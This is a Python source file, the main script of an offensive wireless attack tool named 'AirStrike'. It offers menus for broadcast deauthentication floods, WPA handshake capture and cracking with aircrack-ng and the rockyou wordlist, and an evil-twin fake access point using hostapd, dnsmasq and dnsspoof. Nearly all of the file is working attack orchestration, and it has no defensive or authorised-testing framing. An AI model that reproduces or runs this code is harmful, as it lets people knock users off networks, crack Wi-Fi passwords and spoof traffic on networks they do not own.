import os
import time
import subprocess
import threading
# Local imports
from utils.banner import banner, team
from utils.network_utils import set_managed_mode, set_monitor_mode, run_scan, display_and_choose_ap
from attacks.deauth_attack import deauth_worker
from attacks.capture_attack import capture_worker
from attacks.evil_twin import EvilTwin

# Global configuration
interface = "wlan0"
wordlist = "/usr/share/wordlists/rockyou.txt"
base_capture_dir = "./captures/"

def main_menu():
    while True:
        print("\n" + "="*40)
        print("AirStrike - Main Menu")
        print("="*40)
        print("1. Deauth Attack")
        print("2. Handshake Cracker")
        print("3. Evil Twin Attack")
        print("0. Exit")
        
        choice = input("\nSelect an option (1-3): ").strip()
        
        if choice == "1":
            deauth_menu()
        elif choice == "2":
            cracker_menu()
        elif choice == "3":
            evil_twin_menu()  
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

def deauth_menu():
    print("\n" + "="*40)
    print("Deauthentication Attack")
    print("="*40)

    aps = run_scan(interface)
    if not aps:
        print("No networks found. Returning to main menu.")
        return

    bssid, channel = display_and_choose_ap(aps)
    if not bssid or not channel:
        return

    # switch to monitor mode
    set_monitor_mode(interface)

    # lock the NIC on the victim's channel
    try:
        subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True)
        print(f"[Setup] Interface {interface} set to channel {channel}")
    except subprocess.CalledProcessError as e:
        print(f"[Error] Failed to set channel {channel}: {e}")
        set_managed_mode(interface)
        return

    stop_event = threading.Event()

    try:
        deauth_thread = threading.Thread(
            target=deauth_worker,
            args=(bssid, "FF:FF:FF:FF:FF:FF", interface, 10, 0.1, stop_event),
            daemon=True
        )

        print("\nStarting aggressive deauth attack...")
        deauth_thread.start()

        while deauth_thread.is_alive():
            deauth_thread.join(timeout=0.5)

    except KeyboardInterrupt:
        print("\nStopping attack…")
        stop_event.set()
        deauth_thread.join(timeout=2)

    # restore managed mode for your wireless stack
    set_managed_mode(interface)
    print("Returning to main menu.")


def cracker_menu():
    print("\n" + "="*40)
    print("Handshake Cracker")
    print("="*40)
    
    aps = run_scan(interface)
    if not aps:
        print("No networks found. Returning to main menu.")
        return
    
    bssid, channel = display_and_choose_ap(aps)
    if not bssid or not channel:
        return
    
    safe_bssid = bssid.replace(":", "-")
    output_dir = os.path.join(base_capture_dir, safe_bssid)
    os.makedirs(output_dir, exist_ok=True)
    cap_file = os.path.join(output_dir, "capture-01.cap")
    
    # Check for existing handshake
    if os.path.exists(cap_file):
        if validate_handshake(cap_file):
            print("\nExisting valid handshake found!")
            crack_handshake(cap_file)
            return
    
    print("\nNo valid handshake found. Starting capture process...")
    stop_event = threading.Event()
    
    try:
        # Start capture thread
        capture_thread = threading.Thread(
            target=capture_worker,
            args=(bssid, channel, interface, 5, os.path.join(output_dir, "capture"), cap_file, wordlist, stop_event),
            daemon=True
        )
        
        # Start deauth thread
        deauth_thread = threading.Thread(
            target=deauth_worker,
            args=(bssid, "FF:FF:FF:FF:FF:FF", interface, 10, 0.1, stop_event),
            daemon=True
        )
        
        capture_thread.start()
        time.sleep(2)
        deauth_thread.start()
        
        # Monitor threads
        while capture_thread.is_alive():
            capture_thread.join(timeout=0.5)
            
        stop_event.set()
        if deauth_thread.is_alive():
            deauth_thread.join(timeout=5)
            
        if os.path.exists(cap_file):
            if validate_handshake(cap_file):
                crack_handshake(cap_file)
                
    except KeyboardInterrupt:
        print("\nStopping attack...")
        stop_event.set()
        capture_thread.join(timeout=5)
        deauth_thread.join(timeout=2)
    
    set_managed_mode(interface)

def validate_handshake(cap_file):
    try:
        result = subprocess.run(
            ["tshark", "-r", cap_file, "-Y", "eapol"],
            capture_output=True,
            text=True,
            check=True
        )
        
        messages = {
            "Message 1 of 4": False,
            "Message 2 of 4": False,
            "Message 3 of 4": False,
            "Message 4 of 4": False
        }
        
        for line in result.stdout.split('\n'):
            if "Message 1 of 4" in line:
                messages["Message 1 of 4"] = True
                print("Detected EAPOL Message 1/4")
            elif "Message 2 of 4" in line:
                messages["Message 2 of 4"] = True
                print("Detected EAPOL Message 2/4")
            elif "Message 3 of 4" in line:
                messages["Message 3 of 4"] = True
                print("Detected EAPOL Message 3/4")
            elif "Message 4 of 4" in line:
                messages["Message 4 of 4"] = True
                print("Detected EAPOL Message 4/4")
        
        return all(messages.values())
    
    except subprocess.CalledProcessError:
        return False
    except Exception as e:
        print(f"Validation error: {e}")
        return False

def crack_handshake(cap_file):
    if not os.path.exists(wordlist):
        print(f"Wordlist not found at {wordlist}")
        return
    
    print("\nStarting cracking process...")
    try:
        subprocess.run(
            ["aircrack-ng", "-w", wordlist, "-b", get_bssid_from_cap(cap_file), cap_file],
            check=True
        )
    except subprocess.CalledProcessError:
        print("Cracking failed - password not found in wordlist")
    except Exception as e:
        print(f"Cracking error: {e}")

def get_bssid_from_cap(cap_file):
    try:
        result = subprocess.run(
            ["tshark", "-r", cap_file, "-T", "fields", "-e", "wlan.bssid"],
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout.split('\n')[0].strip()
    except Exception as e:
        print(f"Error getting BSSID: {e}")
        return ""
    
def evil_twin_menu():
    from utils.network_utils import set_managed_mode
    global interface
    print("\n" + "="*40)
    print("Evil Twin Attack")
    print("="*40)
    # ensure interface in managed/AP mode
    set_managed_mode(interface)
    ssid = input("Enter SSID to clone: ").strip()
    channel = input("Enter channel number: ").strip()
    # create config files
    hostapd_conf = create_hostapd_config(interface, ssid, channel)
    dnsmasq_conf = create_dnsmasq_config(interface)
    if hostapd_conf and dnsmasq_conf:
        setup_fake_ap_network(interface)
        commands = [
            f"hostapd {hostapd_conf}",
            f"dnsmasq -C {dnsmasq_conf} -d",
            f"dnsspoof -i {interface}"
        ]
        for cmd in commands:
            open_terminal_with_command(cmd)
    else:
        print("[-] Failed to create required config files. Exiting.")


if __name__ == "__main__":
    print(banner("AirStrike"))
    team()
    set_managed_mode(interface)
    main_menu()
    set_managed_mode(interface)